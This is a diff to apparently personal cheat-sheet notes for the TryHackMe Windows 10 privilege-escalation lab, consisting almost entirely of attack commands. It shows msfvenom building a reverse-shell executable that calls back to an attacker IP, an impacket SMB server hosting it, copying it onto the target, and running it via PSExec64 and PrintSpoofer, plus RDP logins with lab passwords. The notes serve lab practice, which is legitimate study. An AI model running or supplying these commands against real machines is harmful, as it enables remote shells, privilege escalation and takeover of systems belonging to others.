@@ -3,11 +3,8 @@
 ## TRYHACKME
 ```
 https://tryhackme.com/room/windows10privesc
-
-VULENRABLE VM ACCESS
 xfreerdp /u:user /p:password321 /cert:ignore /v:10.10.63.26 
-
-PAYLOAD CREATION
+xfreerdp /u:admin /p:password123 /cert:ignore /v:10.10.93.233
 msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.18.5.137 LPORT=1234 -f exe -o reverse.exe
 
 LISTENER SETUP (OPTION1)
@@ -368,6 +365,8 @@ xfreerdp /u:user /p:password321 /cert:ignore /v:10.10.128.34
 msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.18.5.137 LPORT=1234 -f exe -o reverse.exe
 python3 /usr/share/doc/python3-impacket/examples/smbserver.py kali .
 copy \\10.18.5.137\kali\reverse.exe C:\PrivEsc\reverse.exe
+
+xfreerdp /u:admin /p:password123 /cert:ignore /v:10.10.93.233
 PSExec64.exe -i -u "nt authority\local service" C:\PrivEsc\reverse.exe
 PrintSpoofer.exe -c "C:\PrivEsc\reverse.exe" -i
 ```
